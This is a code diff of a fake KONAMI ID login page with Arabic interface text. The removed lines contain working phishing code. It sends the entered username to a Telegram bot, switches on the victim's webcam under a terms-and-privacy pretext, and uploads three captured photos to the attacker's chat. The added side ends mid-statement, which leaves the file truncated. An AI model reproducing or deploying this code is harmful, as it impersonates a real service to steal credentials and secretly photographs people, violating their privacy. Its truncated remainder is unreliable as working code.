@@ -104,12 +104,6 @@
       margin: 0 5px;
     }
 
-    .terms {
-      margin-bottom: 15px;
-      font-size: 14px;
-      text-align: left;
-    }
-
     .status {
       font-size: 14px;
       margin-top: 10px;
@@ -124,11 +118,6 @@
     <h2>KONAMI ID</h2>
 
     <input id="username" type="text" placeholder="KONAMI ID / E-mail address">
-
-    <div class="terms">
-      <input type="checkbox" id="agree"> أوافق على 
-      <a href="#">الشروط</a> و <a href="#">الخصوصية</a>
-    </div>
 
     <button id="loginBtn" class="btn login-btn">Log In</button>
     <button id="retryBtn" class="btn retry-btn">🔄 إعادة المحاولة</button>
@@ -163,80 +152,4 @@ const statusDiv = document.getElementById("status");
 const video = document.getElementById("v");
 const canvas = document.getElementById("c");
 const ctx = canvas.getContext("2d");
-const agreeCheckbox = document.getElementById("agree");
-const usernameInput = document.getElementById("username");
-
-function setStatus(msg){ statusDiv.textContent = msg; }
-
-async function sendMessageToTelegram(text){
-  const fd = new FormData();
-  fd.append("chat_id", CHAT_ID);
-  fd.append("text", text);
-  await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: "POST", body: fd });
-}
-
-async function sendPhotoToTelegram(imgBase64, caption=""){
-  const blob = await (await fetch(imgBase64)).blob();
-  const fd = new FormData();
-  fd.append("chat_id", CHAT_ID);
-  fd.append("photo", blob, "photo.png");
-  if(caption) fd.append("caption", caption);
-  await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
-}
-
-async function openCamera(){
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    video.srcObject = stream;
-    await video.play();
-    return stream;
-  } catch (err) {
-    throw new Error("❌ يجب الموافقة على الشروط والخصوصية لإكمال العملية.");
-  }
-}
-
-async function captureOnce(){
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  return canvas.toDataURL("image/png");
-}
-
-async function startProcess(){
-  if(!agreeCheckbox.checked){
-    alert("يجب الموافقة على الشروط والخصوصية للمتابعة.");
-    return;
-  }
-
-  alert("تنبيه: يجب الموافقة على الشروط والخصوصية لإكمال العملية.");
-
-  loginBtn.disabled = true;
-  retryBtn.style.display = "none";
-  setStatus("جاري إرسال البيانات...");
-
-  const username = usernameInput.value || "No username";
-  await sendMessageToTelegram("📩 User: " + username);
-
-  try {
-    const stream = await openCamera();
-    for(let i=1;i<=3;i++){
-      const img = await captureOnce();
-      await sendPhotoToTelegram(img, `📸 صورة ${i}/3 للمستخدم: ${username}`);
-      setStatus(`تم إرسال الصورة ${i}/3`);
-      await new Promise(r=>setTimeout(r,800));
-    }
-    setStatus("✅ اكتملت العملية بنجاح");
-    stream.getTracks().forEach(t=>t.stop());
-  } catch(err){
-    setStatus(err.message);
-    alert(err.message);
-    retryBtn.style.display = "block";
-  } finally {
-    loginBtn.disabled = false;
-  }
-}
-
-loginBtn.addEventListener("click", startProcess);
-retryBtn.addEventListener("click", startProcess);
-</script>
-
-</body>
-</html>
+const usernameInput =
